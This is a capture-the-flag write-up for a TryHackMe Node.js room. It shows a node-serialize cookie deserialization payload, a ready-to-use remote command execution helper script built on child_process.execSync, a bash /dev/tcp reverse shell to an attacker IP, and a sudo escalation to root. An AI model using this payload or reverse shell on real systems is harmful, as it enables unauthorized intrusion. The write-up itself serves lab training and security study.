# jason

Room: https://tryhackme.com/room/jason

Jax sucks alot.............

In JavaScript everything is a terrible mistake.

We are Horror LLC, we specialize in horror, but one of the scarier aspects of our company is our front-end webserver. We can't launch our site in its current state and our level of concern regarding our cybersecurity is growing exponentially. We ask that you perform a thorough penetration test and try to compromise the root account. There are no rules for this engagement. Good luck!

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/jason.md

## Overview

This room involved a small Node.js web application running on port 80. The intended path was through a client-side cookie issue that led to unsafe Node.js deserialization. After gaining remote command execution as the `ubuntu` user, privilege escalation was straightforward because the user had passwordless sudo access.

## Enumeration

I started with a full TCP port scan.

```bash
nmap -sV -p- 10.65.167.217
```

The scan found only two open ports.

```text
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http
```

The web service returned a basic landing page for **Horror LLC**.

```html
<title>Horror LLC</title>
<h4>Built with Nodejs</h4>
```

The page included a newsletter signup form and some client-side JavaScript.

## Web Enumeration

A Gobuster scan initially failed because the application returned a `200 OK` response for non-existent paths.

```text
Error: the server returns a status code that matches the provided options for non existing urls
http://10.65.167.217/random => 200 Length: 3559
```

To work around the wildcard response, I filtered by the default response length.

```bash
gobuster dir -u http://10.65.167.217 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html \
  -t 30 \
  --exclude-length 3559
```

The important finding came from reviewing the page source instead of directory brute forcing.

## Reviewing the JavaScript

The page contained this JavaScript tied to the signup button.

```javascript
document.getElementById("signup").addEventListener("click", function() {
    var date = new Date();
    date.setTime(date.getTime()+(-1*24*60*60*1000));
    var expires = "; expires="+date.toGMTString();
    document.cookie = "session=foobar"+expires+"; path=/";

    const Http = new XMLHttpRequest();
    const url=window.location.href+"?email="+document.getElementById("fname").value;
    Http.open("POST", url);
    Http.send();

    setTimeout(function() {
        window.location.reload();
    }, 500);
});
```

This was suspicious because the page created a `session` cookie, but set the expiry date to the past. That meant the browser would immediately delete it.

I tested the application manually with a cookie.

```bash
curl -i http://10.65.167.217/ -H 'Cookie: session=foobar'
```

This changed the page output.

```html
<h3>We'll keep you updated at: guest</h3>
```

That confirmed the application behaved differently when a `session` cookie was present.

## Testing the Session Cookie

At first, different plain cookie values all returned the same guest output.

```bash
curl -i http://10.65.167.217/ -H 'Cookie: session=admin'
curl -i http://10.65.167.217/ -H 'Cookie: session=guest'
curl -i http://10.65.167.217/ -H 'Cookie: session=1'
```

They all returned:

```html
<h3>We'll keep you updated at: guest</h3>
```

Because this was a Node.js app, I tested whether the cookie was being parsed as encoded JSON.

I created base64 encoded JSON values such as:

```json
{"email":"admin@horror.llc"}
```

Then sent that value as the `session` cookie.

```bash
curl -s http://10.65.167.217/ \
  -H 'Cookie: session=eyJlbWFpbCI6ImFkbWluQGhvcnJvci5sbGMifQ=='
```

The page reflected the value from the cookie.

```html
<h3>We'll keep you updated at: admin@horror.llc</h3>
```

This confirmed the cookie was a base64 encoded JSON object, and the application trusted the `email` property.

## Confirming Unsafe Node.js Deserialization

Since the application was Node.js and was parsing a client-controlled object from the cookie, I tested for unsafe deserialization using a `node-serialize` style payload.

The payload used the special `_$$ND_FUNC$$_` marker.

```json
{"email":"_$$ND_FUNC$$_function(){return 'pwned'}()"}
```

After base64 encoding it, I sent it as the session cookie.

```bash
curl -s http://10.65.167.217/ \
  -H 'Cookie: session=eyJlbWFpbCI6ICJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXR1cm4gJ3B3bmVkJ30oKSJ9' \
  | grep -oP '<h3>.*?</h3>'
```

The response confirmed code execution inside the deserialization process.

```html
<h3>We'll keep you updated at: pwned</h3>
```

## Remote Command Execution

Next, I used Node.js `child_process.execSync` to execute system commands.

I created a helper script called `node-rce.sh`.

```bash
cat > node-rce.sh << 'EOF'
#!/bin/bash
cmd="$1"
c=$(CMD="$cmd" python3 - << 'PY'
import base64, json, os
cmd = os.environ["CMD"]
wrapped = f"{cmd} | base64 -w0"
p = {"email":f"_$$ND_FUNC$$_function(){{return require('child_process').execSync({wrapped!r}).toString()}}()"}
print(base64.b64encode(json.dumps(p).encode()).decode())
PY
)
curl -s http://10.65.167.217/ -H "Cookie: session=$c" |
grep -oP '<h3>.*?</h3>' |
sed 's/<[^>]*>//g' |
sed 's/.*at: //' |
base64 -d
echo
EOF

chmod +x node-rce.sh
```

I tested command execution.

```bash
./node-rce.sh 'id'
./node-rce.sh 'whoami'
```

The application was running as the `ubuntu` user.

```text
uid=1001(ubuntu) gid=1002(ubuntu)
ubuntu
```

## Getting a Shell

Using the RCE, I triggered a reverse shell.

On my attacking machine:

```bash
nc -lvnp 4444
```

Then through the RCE:

```bash
./node-rce.sh 'bash -c "bash -i >& /dev/tcp/10.65.74.165/4444 0>&1"'
```

This gave a shell as `ubuntu`.

```text
ubuntu@ip-10-65-167-217:/opt/webapp$
```

The web application directory contained the Node.js app files.

```bash
ls
```

```text
index.html
node_modules
package.json
package-lock.json
server.js
```

## User Flag

I checked `/home` and found another user directory.

```bash
cd /home
ls
```

```text
dylan
ubuntu
```

Inside `/home/dylan`, I found the user flag.

```bash
cd /home/dylan
ls
cat user.txt
```

```text
user.txt
0ba487...af217c
```

## Privilege Escalation

The `ubuntu` user had useful group memberships, including `sudo` and `lxd`.

```bash
id
```

```text
uid=1001(ubuntu) gid=1002(ubuntu) groups=1002(ubuntu),4(adm),27(sudo),116(lxd)
```

I checked sudo permissions.

```bash
sudo -l
```

The result showed that `ubuntu` could run all commands as root without a password.

```text
User ubuntu may run the following commands on ip-10-65-167-217:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

That meant privilege escalation was immediate.

```bash
sudo -i
```

I confirmed root access.

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

## Root Flag

Finally, I read the root flag.

```bash
cd /root
ls
cat root.txt
```

```text
root.txt
2cd5a9...41760e
```

## Summary

The attack path was:

1. Enumerated open ports and found SSH and HTTP.
2. Reviewed the Node.js web page source.
3. Found client-side creation of an expired `session` cookie.
4. Manually supplied a `session` cookie and confirmed changed behaviour.
5. Discovered the cookie was base64 encoded JSON.
6. Controlled the reflected `email` value through the cookie.
7. Confirmed unsafe Node.js deserialization with `_$$ND_FUNC$$_`.
8. Used `child_process.execSync` for remote command execution.
9. Got a reverse shell as `ubuntu`.
10. Read the user flag from `/home/dylan/user.txt`.
11. Found `ubuntu` had `NOPASSWD: ALL` sudo rights.
12. Used `sudo -i` to become root.
13. Read the root flag from `/root/root.txt`.

## Key Takeaway

The main issue was trusting a client-controlled base64 encoded JSON cookie and deserializing it unsafely. Because the application evaluated function payloads during deserialization, the cookie became a direct remote command execution vector.

